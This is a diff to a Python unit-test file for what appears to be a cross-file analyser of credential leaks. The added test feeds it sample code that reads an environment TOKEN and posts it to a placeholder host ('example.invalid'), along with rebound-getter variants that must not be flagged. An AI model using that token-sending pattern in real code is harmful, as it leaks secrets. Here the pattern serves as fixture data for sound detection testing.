@@ -24,6 +24,13 @@ class CrossFilePrototypeTests(unittest.TestCase):
         self.assertEqual(review.module_name('../secret.py'),'')
         with self.assertRaises(ValueError):review.analyze({str(i):'x' for i in range(501)})
 
+    def test_rebound_or_decorated_getter_does_not_create_false_evidence(self):
+        caller='import requests\nfrom settings import key\nrequests.post("https://example.invalid",json=key())'
+        getter='import os\ndef key():\n return os.getenv("TOKEN")\n'
+        for source in [getter+'key=lambda: "public"\n', getter+'def key():\n return "public"\n', 'import os\n@replace\ndef key():\n return os.getenv("TOKEN")\n', getter+'from safe import key\n']:
+            with self.subTest(source=source):
+                self.assertFalse(review.analyze({'settings.py':source,'main.py':caller})['findings'])
+
     def test_aliases_and_credential_names_have_grounded_line_numbers(self):
         for provider in ['import os as operating\ndef read():\n return operating.getenv("OPENAI_API_KEY")', 'from os import getenv as env\ndef read():\n return env("ACCESS_TOKEN")']:
             for lib in ['requests','httpx']:
